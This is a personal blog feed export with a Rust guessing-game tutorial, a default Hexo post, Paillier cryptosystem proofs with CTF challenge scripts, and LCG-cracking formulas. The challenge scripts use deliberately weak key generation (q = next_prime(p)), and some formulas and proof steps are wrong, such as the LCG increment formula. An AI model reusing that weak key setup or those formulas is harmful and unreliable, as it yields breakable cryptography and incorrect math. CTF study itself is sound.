<h3 id="go-over-it-line-by-line-1"><a href="#go-over-it-line-by-line-1" class="headerlink" title="go over it line by line"></a>go over it line by line</h3><p>First, add the line <code>use rand::Rng;</code>. <code>Rng</code>  trait defines methods that random generators implement, and the trait must be in scope for us to use those methods.</p>
<p>Second, we call <code>rand::thread_rng</code> function that gives us the random generator, and it is local to the current thread of execution and is seeded by the operating system.</p>
<p>Third, <code>gen_range</code>is a function that define the random number range, which we brought into scope with the <code>rand::Rng;</code> statement.</p>
<p><em>The usage is that <code>start..=end</code>, is inclusive on the lower and upper bounds. For example <code>1..=100</code> means request a number between 1 and 100.</em></p>
<blockquote>
<p>You wonâ€™t just know which traits to use and which methods and functions to call from a crate, so each crate has documentation with instructions for using it.</p>
</blockquote>
<h2 id="ensure-reproducible-build-with-the-cargo-lock-file"><a href="#ensure-reproducible-build-with-the-cargo-lock-file" class="headerlink" title="ensure reproducible build with the cargo.lock file"></a>ensure reproducible build with the <code>cargo.lock</code> file</h2><p>Rust creates the <code>Cargo.lock</code> file the first time when running <code>cargo build</code>.</p>
<p>The <code>Cargo.lock</code> file is important for reproducible builds, and itâ€™s often checked into source control with the rest of the code in your project.</p>
<h2 id="update-a-crat-to-get-a-new-version"><a href="#update-a-crat-to-get-a-new-version" class="headerlink" title="update a crat to get a new version"></a>update a crat to get a new version</h2><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">cargo update</span><br></pre></td></tr></table></figure>

<p>and the dependencies will change.</p>
<p>The next time you run <code>cargo build</code>, Cargo will update the registry of crates available and reevaluate your <code>rand</code> requirements according to the new version you have specified.</p>
<p>Cargo makes it very easy to reuse libraries, so Rustaceans are able to write smaller projects that are assembled from a number of packages.</p>
<p><em>Rustaceans means users or developers who use the <code>Rust</code></em></p>
<p>at this time, the complete code is:</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> std::io; <span class="comment">//bring the io library which comes from the standard library (std)</span></span><br><span class="line"><span class="keyword">use</span> rand::Rng;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123; <span class="comment">//fn means a new function</span></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;Guessing the number!&quot;</span>); <span class="comment">//state what the game is</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">secret_number</span> = rand::<span class="title function_ invoke__">thread_rng</span>().<span class="title function_ invoke__">gen_range</span>(<span class="number">1</span>..=<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;The secret number is: &#123;secret_number&#125;&quot;</span>); </span><br><span class="line"></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;Please input your guess:&quot;</span>); <span class="comment">//request input from the user</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">guess</span> = <span class="type">String</span>::<span class="title function_ invoke__">new</span>(); <span class="comment">//&#x27;let&#x27; statement to create a variable to store the user&#x27;s input, to rmember that once given it will not change</span></span><br><span class="line">    io::<span class="title function_ invoke__">stdin</span>()</span><br><span class="line">        .<span class="title function_ invoke__">read_line</span>(&amp;<span class="keyword">mut</span> guess)</span><br><span class="line">        .<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Failed to read line&quot;</span>); <span class="comment">// not except</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;You guessed: &#123;&#125;&quot;</span>, guess);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>when we run <code>cargo run</code>, we will see:</p>
<img src="/2023/06/07/Rust-Study/image-20231107103926686.png" class="" title="image-20231107103926686">

<p>However it wonâ€™t achieve the aim to generate a secret number and compare it to the guessing number.</p>
<h2 id="compare-the-guess-to-the-secret-number"><a href="#compare-the-guess-to-the-secret-number" class="headerlink" title="compare the guess to the secret number"></a>compare the guess to the secret number</h2><h3 id="Step1"><a href="#Step1" class="headerlink" title="Step1"></a>Step1</h3><p><strong>make a comparison</strong></p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> std::cmp::Ordering</span><br><span class="line"></span><br><span class="line"><span class="comment">// based on the original foundation</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">guess</span>: <span class="type">u32</span> = guess.<span class="title function_ invoke__">trim</span>().<span class="title function_ invoke__">parse</span>().<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Please type a number!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">match</span> guess.<span class="title function_ invoke__">cmp</span>(&amp;secret_number) &#123;</span><br><span class="line">            Ordering::Less =&gt; <span class="built_in">println!</span>(<span class="string">&quot;Too small!&quot;</span>),</span><br><span class="line">            Ordering::Greater =&gt; <span class="built_in">println!</span>(<span class="string">&quot;Too big!&quot;</span>),</span><br><span class="line">            Ordering::Equal =&gt; <span class="built_in">println!</span>(<span class="string">&quot;YOU WIN!&quot;</span>),</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>However it return a number comparison and break.</p>
<h3 id="Step2"><a href="#Step2" class="headerlink" title="Step2"></a>Step2</h3><p><strong>turn into a loop</strong></p>
<p>Notice the numbersâ€™ usage and the order of using these different numbers.</p>
<p>We ought to generate different <code>guess</code> to solve out the <code>secret_number</code> which is generated by the system.</p>
<p>So <code>secret_number</code> is above loop.</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">secret_number</span> = rand::<span class="title function_ invoke__">thread_rng</span>().<span class="title function_ invoke__">gen_range</span>(<span class="number">1</span>..=<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">loop</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">guess</span> = <span class="type">String</span>::<span class="title function_ invoke__">new</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">guess</span>: <span class="type">u32</span> = guess.<span class="title function_ invoke__">trim</span>().<span class="title function_ invoke__">parse</span>().<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Please type a number!&quot;</span>);</span><br><span class="line">    <span class="keyword">match</span> guess.<span class="title function_ invoke__">cmp</span>(&amp;secret_number) &#123;</span><br><span class="line">            Ordering::Less =&gt; <span class="built_in">println!</span>(<span class="string">&quot;Too small!&quot;</span>),</span><br><span class="line">            Ordering::Greater =&gt; <span class="built_in">println!</span>(<span class="string">&quot;Too big!&quot;</span>),</span><br><span class="line">            Ordering::Equal =&gt; <span class="built_in">println!</span>(<span class="string">&quot;YOU WIN!&quot;</span>),</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Step3"><a href="#Step3" class="headerlink" title="Step3"></a>Step3</h3><p><strong>equal then break</strong></p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">match</span> guess.<span class="title function_ invoke__">cmp</span>(&amp;secret_number) &#123;</span><br><span class="line">            Ordering::Less =&gt; <span class="built_in">println!</span>(<span class="string">&quot;Too small!&quot;</span>),</span><br><span class="line">            Ordering::Greater =&gt; <span class="built_in">println!</span>(<span class="string">&quot;Too big!&quot;</span>),</span><br><span class="line">            Ordering::Equal =&gt; &#123;</span><br><span class="line">                <span class="built_in">println!</span>(<span class="string">&quot;YOU WIN!&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;      </span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<h3 id="complete-code"><a href="#complete-code" class="headerlink" title="complete code"></a>complete code</h3><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> std::io;</span><br><span class="line"><span class="keyword">use</span> rand::Rng;</span><br><span class="line"><span class="keyword">use</span> std::cmp::Ordering;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>()&#123;</span><br><span class="line">    <span class="comment">// generte a random number</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">secret_number</span> = rand::<span class="title function_ invoke__">thread_rng</span>().<span class="title function_ invoke__">gen_range</span>(<span class="number">1</span>..=<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// guess number, need to define the type is real a number</span></span><br><span class="line">    <span class="comment">// the precess of guessing is changeable which we should let it in a loop</span></span><br><span class="line">    <span class="keyword">loop</span> &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;Please input your guess!&quot;</span>);</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">guess</span> = <span class="type">String</span>::<span class="title function_ invoke__">new</span>();</span><br><span class="line">        io::<span class="title function_ invoke__">stdin</span>()</span><br><span class="line">            .<span class="title function_ invoke__">read_line</span>(&amp;<span class="keyword">mut</span> guess)</span><br><span class="line">            .<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Fail to read line!&quot;</span>);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">guess</span>: <span class="type">u32</span> = guess.<span class="title function_ invoke__">trim</span>().<span class="title function_ invoke__">parse</span>().<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Please type a number!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;You guessed: &#123;guess&#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// compare the two numbers</span></span><br><span class="line">        <span class="keyword">match</span> guess.<span class="title function_ invoke__">cmp</span>(&amp;secret_number) &#123;</span><br><span class="line">            Ordering::Less =&gt; <span class="built_in">println!</span>(<span class="string">&quot;Too small!&quot;</span>),</span><br><span class="line">            Ordering::Greater =&gt; <span class="built_in">println!</span>(<span class="string">&quot;Too big!&quot;</span>),</span><br><span class="line">            Ordering::Equal =&gt; &#123;</span><br><span class="line">                <span class="built_in">println!</span>(<span class="string">&quot;YOU WIN!&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;      </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>run <code>cargo run</code>:</p>
<img src="/2023/06/07/Rust-Study/image-20231107150820040.png" class="" title="image-20231107150820040">



<h2 id="handle-invalid-input"><a href="#handle-invalid-input" class="headerlink" title="handle invalid input"></a>handle invalid input</h2><p>To further refine the gameâ€™s behavior, rather than crashing the program when the user inputs a non-number, letâ€™s make the game ignore a non-number so the user can continue guessing. We can do that by altering the line where <code>guess</code> is converted from a <code>String</code> to a <code>u32</code>, as shown in Listing 2-5.</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="comment">//let guess: u32 = guess.trim().parse().expect(&quot;Please type a number!&quot;);</span></span><br><span class="line">        <span class="keyword">let</span> <span class="variable">guess</span>: <span class="type">u32</span> = <span class="keyword">match</span> guess.<span class="title function_ invoke__">trim</span>().<span class="title function_ invoke__">parse</span>() &#123;</span><br><span class="line">            <span class="title function_ invoke__">Ok</span>(num) =&gt; num,</span><br><span class="line">            <span class="title function_ invoke__">Err</span>(_) =&gt; <span class="keyword">continue</span>,</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure>

<h3 id="go-over-it-line-by-line-2"><a href="#go-over-it-line-by-line-2" class="headerlink" title="go over it line by line"></a>go over it line by line</h3><p>Switch an <code>expect</code> call to a <code>match</code> expression to move from crashing on an error to handle the error.</p>
<p>The <code>parse</code> returns a <code>Result</code> type and <code>Result</code> is an <code>enum</code> that has the variants <code>Ok</code> and <code>Err</code>.</p>
<p>We use a <code>match</code> expression here, same as the <code>Ordering</code> result if the <code>cmp</code> method.</p>
<ul>
<li>If <code>parse</code> is able to turn the string into a number, return <code>Ok</code> contains <code>resultant number</code>. The number will end up right where we want it in the new <code>guess</code> variable weâ€™re creating.</li>
<li>If not, it will return an <code>Err</code> value, we just <code>continue</code> and return to <code>loop</code> to ask for another guess.</li>
</ul>
<p>Finally ,the program ignores all errors that <code>parse</code> might encounter.</p>
<h1 id="Common-programming-concepts"><a href="#Common-programming-concepts" class="headerlink" title="Common programming concepts"></a>Common programming concepts</h1><h2 id="variables-and-mutability"><a href="#variables-and-mutability" class="headerlink" title="variables and mutability"></a>variables and mutability</h2><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="comment">// fn main() &#123;</span></span><br><span class="line"><span class="comment">//     let x = 5;</span></span><br><span class="line"><span class="comment">//     println!(&quot;The value of x is: &#123;x&#125;&quot;);</span></span><br><span class="line"><span class="comment">//     x = 6;</span></span><br><span class="line"><span class="comment">//     println!(&quot;The value of x is: &#123;x&#125;&quot;);</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">x</span> = <span class="number">5</span>;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;The value of x is: &#123;x&#125;&quot;</span>);</span><br><span class="line">    x = <span class="number">6</span>;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;The value of x is: &#123;x&#125;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Language</category>
      </categories>
      <tags>
        <tag>rust</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2022/10/21/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<span id="more"></span>

<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>Paillier-Cryptosystem</title>
    <url>/2023/03/15/paillier-cryptosystem/</url>
    <content><![CDATA[<p>Two different approaches to homomorphic encryption. These ways are called as â€œpaillier-cryptosystemâ€. </p>
<p>And to understand the principle behind them, I do the proof. </p>
<span id="more"></span><!--toc-->

<h1 id="INIT"><a href="#INIT" class="headerlink" title="INIT"></a>INIT</h1><h2 id="FIRST-PATTERN"><a href="#FIRST-PATTERN" class="headerlink" title="FIRST PATTERN"></a>FIRST PATTERN</h2><ul>
<li><p>produce two large primes $p$, $q$, assert them that $gcd(p\times q, (p-1)\times(q-1) &#x3D; 1$</p>
</li>
<li><p>calculate $n &#x3D; p\times q$, define that $\lambda &#x3D; lcm(p-1, q-1) &#x3D; \frac{(p-1)\times(q-1)}{gcd(p-1, q-1)}$</p>
</li>
<li><p>produce random $g$, and $0&lt;g&lt;n^{2}$</p>
</li>
<li><p>define that $L(x) &#x3D; \frac{x-1}{n}$</p>
</li>
<li><p>define that $\mu &#x3D; (L(g^{\lambda} \mod n^{2}))^{-1} \mod n$</p>
</li>
</ul>
<h2 id="SECOND-PATTERN"><a href="#SECOND-PATTERN" class="headerlink" title="SECOND PATTERN"></a>SECOND PATTERN</h2><ul>
<li><p>define that $g &#x3D; n  + 1$</p>
</li>
<li><p>define that $\lambda &#x3D; \varphi(n) &#x3D; (p-1)\times (q-1) $</p>
</li>
<li><p>and also define that $\mu &#x3D; \varphi(n)^{-1} \mod n$</p>
</li>
</ul>
<h1 id="KEYS"><a href="#KEYS" class="headerlink" title="KEYS"></a>KEYS</h1><ul>
<li>PK &#x3D; {$n$, $g$}</li>
<li>SK &#x3D; {$\lambda$, $\mu$}</li>
</ul>
<h1 id="ENCRYPT-AND-DECRYPT"><a href="#ENCRYPT-AND-DECRYPT" class="headerlink" title="ENCRYPT AND DECRYPT"></a>ENCRYPT AND DECRYPT</h1><h2 id="ENCRYPT"><a href="#ENCRYPT" class="headerlink" title="ENCRYPT"></a>ENCRYPT</h2><ul>
<li>assert that $0&lt;m&lt;n$</li>
<li>produce a random $r$, assert that $gcd(r, n) &#x3D; 1$</li>
<li>$c \equiv g^{m} \cdot r^{n} \mod n^{2}$</li>
</ul>
<h2 id="DECRYPT"><a href="#DECRYPT" class="headerlink" title="DECRYPT"></a>DECRYPT</h2><ul>
<li>$m \equiv (L(c^{\lambda} \mod n^{2})\cdot \mu)\mod n$</li>
</ul>
<h1 id="PROOF"><a href="#PROOF" class="headerlink" title="PROOF"></a>PROOF</h1><h2 id="PATTERN-1"><a href="#PATTERN-1" class="headerlink" title="PATTERN 1"></a>PATTERN 1</h2><ul>
<li>substitute the equation of $c$ into $m$, we get the $eq1$</li>
</ul>
<p>$$<br>m \equiv (L(g^{m\lambda}\cdot r^{n\lambda} \mod n^{2})\cdot \mu)\mod n<br>$$ {eq1}</p>
<ul>
<li>substitute $\mu$ to ${eq1}$, we get the $eq2$</li>
</ul>
<p>$$<br>m \equiv L(g^{m\lambda}\cdot r^{n\lambda} \mod n^{2}) \cdot (L(g^{\lambda} \mod n^{2}))^{-1} \mod n<br>$$ {eq2}</p>
<ul>
<li>make some deductions to get the $g^{\lambda}$</li>
</ul>
<p>$$<br>p-1 | \lambda and  q-1 | \lambda<br>$$</p>
<p>so  we can get the equations that:<br>$$<br>\lambda &#x3D; k_1(p-1) and \lambda &#x3D; k_2(q-1)<br>$$<br>fermat little theorem:<br>$$<br>g^{\lambda} &#x3D; g^{k_1(p-1)} \equiv 1 \mod p<br>$$</p>
<p>$$<br>g^{\lambda} &#x3D; g^{k_2(q-1)} \equiv 1 \mod q<br>$$</p>
<p>$$<br>\Longrightarrow g^{\lambda} - 1 | q and g^{\lambda} - 1 | p<br>$$</p>
<p>$$<br>\Longrightarrow g^{\lambda} - 1 | lcm(p, q)<br>$$</p>
<p>$$<br>\Longrightarrow g^{\lambda} - 1 | n<br>$$</p>
<p>at last, we get the key equation:<br>$$<br>g^{\lambda} \equiv 1 \mod n<br>$$</p>
<p>$$<br>\Longrightarrow g^{\lambda} \mod n^{2} \equiv  1 \mod n<br>$$</p>
<p>$$<br>\Longrightarrow g^{\lambda} &#x3D; 1 + k_g \cdot n<br>$$</p>
<p>the $k_g$ is less than $n$</p>
<p>substitute $g^{\lambda}$ into $L(x)$:<br>$$<br>L(g^{\lambda} \mod n^{2}) &#x3D; k_g<br>$$</p>
<ul>
<li>also make some deductions to get $g^{m\lambda}$</li>
</ul>
<p>$$<br>1 + kn \equiv 1 + kn \mod n^{2}<br>$$</p>
<p>$$<br>(1 + kn)^{2} \equiv 1 + 2kn + (kn)^{2} \mod n^{2} \equiv 1 + 2kn \mod n^{2}<br>$$</p>
<p>$$<br>(1 + kn)^{3} \equiv 1 + 3kn + 3(kn)^{2} + (kn)^{3} \equiv 1+3kn \mod n^{2}<br>$$</p>
<p>$$<br>\Longrightarrow (1 + kn)^{m}\equiv 1+mkn \mod n^{2}<br>$$</p>
<p>$$<br>\Longrightarrow g^{m\lambda}&#x3D;(1+k_gn)^{m}\equiv 1 + mk_gn \mod n^{2}<br>$$</p>
<ul>
<li>same to get $r^{n\lambda}$</li>
</ul>
<p>$$<br>r^{n\lambda} &#x3D;(1+k_rn)^{n}\equiv 1 + k_r n^{2} \mod n^{2} \equiv 1\mod n^{2}<br>$$</p>
<ul>
<li>substitute $g^{m\lambda}$ , $r^{n\lambda}$ and $L(g^{\lambda} \mod n^{2})$ into $eq2$</li>
</ul>
<p>$$<br>m \equiv L(1 + mk_gn \mod n^{2}) \cdot (L(g^{\lambda} \mod n^{2}))^{-1} \mod n<br>$$</p>
<p>$$<br>m \equiv k_g m \cdot k_g^{-1} \mod n \equiv m \mod n<br>$$</p>
<p><strong>Proved.</strong> </p>
<h2 id="PATTERN-2"><a href="#PATTERN-2" class="headerlink" title="PATTERN 2"></a>PATTERN 2</h2><ul>
<li>also substitute $c$ into $m$</li>
</ul>
<p>$$<br>L(g^{m\lambda}\cdot r^{n\lambda} \mod n^{2})\cdot \mu \mod n<br>$$</p>
<ul>
<li>substitute $\lambda$ into $r^{n\lambda}$ and make some deductions</li>
</ul>
<p>$$<br>r^{n\lambda} &#x3D; r^{n(p-1)(q-1)} &#x3D; r^{p(p-1) \cdot q(q-1)}<br>$$</p>
<p>using Eulerâ€™s totient function 3 that $\varphi(p^k) &#x3D; p^k - p^{k-1} &#x3D; (p-1)\cdot p^{k-1} &#x3D; \varphi(p) \cdot p^{k-1}$ and fermat little theorem<br>$$<br>r^{p(p-1) \cdot q(q-1)} &#x3D; r^{\varphi(n^2)} \equiv 1 \mod n^{2}<br>$$</p>
<p>$$<br>r^{n\lambda} \equiv 1 \mod n^{2}<br>$$</p>
<ul>
<li>get the simple equation, we get the $eq3$</li>
</ul>
<p>$$<br>(L(g^{m\lambda} \mod n^{2})\cdot \mu) \mod n<br>$$ {eq3}</p>
<ul>
<li>make some deductions about $g^{m\lambda}$</li>
</ul>
<p>$$<br>g^{m\lambda} \equiv (n + 1)^{m\lambda} \mod n^{2}<br>$$</p>
<p>$$<br>\Longrightarrow g^{m\lambda} \equiv 1 + mn\lambda \mod n^{2}<br>$$</p>
<ul>
<li>substitute $g^{m\lambda}$ into $eq3$</li>
</ul>
<p>$$<br>L(1 + mn\lambda)\cdot \mu \mod n \equiv m\lambda \mu \mod n<br>$$</p>
<p>as $\lambda &#x3D; (p-1)(q-1) &#x3D; \varphi(n)$ and $\mu \equiv \varphi(n)^{-1}\mod n$, we will get that:<br>$$<br>m \varphi(n)\cdot \varphi(n)^{-1} \equiv m \mod n<br>$$<br><strong>Proved.</strong> </p>
<h1 id="EXERCISE"><a href="#EXERCISE" class="headerlink" title="EXERCISE"></a>EXERCISE</h1><h2 id="FIRST"><a href="#FIRST" class="headerlink" title="FIRST"></a>FIRST</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = next_prime(p)</span><br><span class="line"><span class="keyword">assert</span> gcd(p*q, (p-<span class="number">1</span>)*(q-<span class="number">1</span>)) == <span class="number">1</span></span><br><span class="line">n = p*q</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n = &#x27;</span> + <span class="built_in">str</span>(n))</span><br><span class="line"></span><br><span class="line">g = random.randint(<span class="number">1</span>, n*n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;g = &#x27;</span> + <span class="built_in">str</span>(g))</span><br><span class="line">r = random.randint(<span class="number">1</span>, n)</span><br><span class="line"><span class="keyword">assert</span> gcd(r, n) == <span class="number">1</span></span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = (<span class="built_in">pow</span>(g, m, n*n) * <span class="built_in">pow</span>(r, n, n*n)) % (n*n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c = &#x27;</span> + <span class="built_in">str</span>(c))</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">n, g, c</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="SECOND"><a href="#SECOND" class="headerlink" title="SECOND"></a>SECOND</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag, p, q</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = next_prime(p)</span><br><span class="line"></span><br><span class="line">n = p*q</span><br><span class="line">g = n + <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n = &#x27;</span> + <span class="built_in">str</span>(n))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;g = &#x27;</span> + <span class="built_in">str</span>(g))</span><br><span class="line"></span><br><span class="line">r = random.randint(<span class="number">1</span>, n)</span><br><span class="line"><span class="keyword">assert</span> gcd(r, n) == <span class="number">1</span></span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = (<span class="built_in">pow</span>(g, m, n*n) * <span class="built_in">pow</span>(r, n, n*n)) % (n*n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c = &#x27;</span> + <span class="built_in">str</span>(c))</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">n, g, c</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>



<p>Follow the <strong>PROOF</strong>, and we can write scripts to decrypt. </p>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>fermat_little_theorem</tag>
        <tag>proof</tag>
        <tag>ruler</tag>
      </tags>
  </entry>
  <entry>
    <title>LCGs</title>
    <url>/2023/06/27/LCGs/</url>
    <content><![CDATA[<p>The LCG algorithm is applied to the generation of pseudo random numbers.<br>$$<br>X_{n + 1} \equiv (a X_{n} + b) \mod m<br>$$</p>
<p>The LCG defines three variablesâ€”â€”multiplier a, increment b, and modulus m, which decide the generator. </p>
<span id="more"></span><!--toc-->

<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><blockquote>
<p><a href="https://blog.csdn.net/superprintf/article/details/108964563">ctf-lcg</a></p>
</blockquote>
<h1 id="Solving-Formula"><a href="#Solving-Formula" class="headerlink" title="Solving Formula"></a>Solving Formula</h1><table>
<thead>
<tr>
<th>targets</th>
<th>formulae</th>
</tr>
</thead>
<tbody><tr>
<td>$X_{n+1} \rightarrow X_{n}$</td>
<td>$X_{n}\equiv a^{-1}(X_{n+1} - b) \mod m$</td>
</tr>
<tr>
<td>$\rightarrow a$</td>
<td>$a \equiv (X_{n+2} - X_{n+1})(X_{n+1} - X_{n})^{-1} \mod m$</td>
</tr>
<tr>
<td>$\rightarrow b$</td>
<td>$b \equiv (X_{n+1} - X_{n}) \mod m$</td>
</tr>
<tr>
<td>$\rightarrow m$</td>
<td>$t_{n} &#x3D; X_{n + 1} - X_{n}$</td>
</tr>
<tr>
<td></td>
<td>$m &#x3D; gcd((t_{n+1}\cdot t_{n-1} - t_n\cdot t_n), (t_n\cdot t_{n-2} - t_{n-1}\cdot t_{n-1}))$</td>
</tr>
</tbody></table>
<h1 id="Proofs"><a href="#Proofs" class="headerlink" title="Proofs"></a>Proofs</h1><h2 id="formula-1"><a href="#formula-1" class="headerlink" title="formula 1"></a>formula 1</h2><p>$$<br>X_{n+1} \equiv a X_{n} + b \mod m<br>$$</p>
<p>$$<br>aX_{n} \equiv X_{n+1} - b \mod m<br>$$</p>
<p>$$<br>X_{n} \equiv a^{-1} (X_{n+1} - b) \mod m<br>$$</p>
<p>How to calculate $a^{-1}$? We can use <code>Extended Euclidean algorithm</code>.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">MMI = <span class="keyword">lambda</span> A, n,s=<span class="number">1</span>,t=<span class="number">0</span>,N=<span class="number">0</span>: (n &lt; <span class="number">2</span> <span class="keyword">and</span> t%N <span class="keyword">or</span> MMI(n, A%n, t, s-A//n*t, N <span class="keyword">or</span> n),-<span class="number">1</span>)[n&lt;<span class="number">1</span>]</span><br><span class="line"><span class="comment"># &lt;==&gt; MMI = lambda a, n: gmpy2.gcdext(a, n)[1]</span></span><br><span class="line"><span class="comment"># &lt;==&gt; gmpy2.invert(a, n)</span></span><br></pre></td></tr></table></figure>



<h2 id="formula-2"><a href="#formula-2" class="headerlink" title="formula 2"></a>formula 2</h2><p>$$<br>X_{n + 2} \equiv aX_{n + 1} + b \mod m<br>$$</p>
<p>$$<br>X_{n+1} \equiv aX_{n} + b \mod m<br>$$</p>
<p>$$<br>X_{n+2} - X_{n+1} \equiv a(X_{n + 1} - X_{n}) \mod m<br>$$</p>
<p>$$<br>a \equiv (X_{n+2} - X_{n+1})(X_{n+1} - X_{n})^{-1} \mod m<br>$$</p>
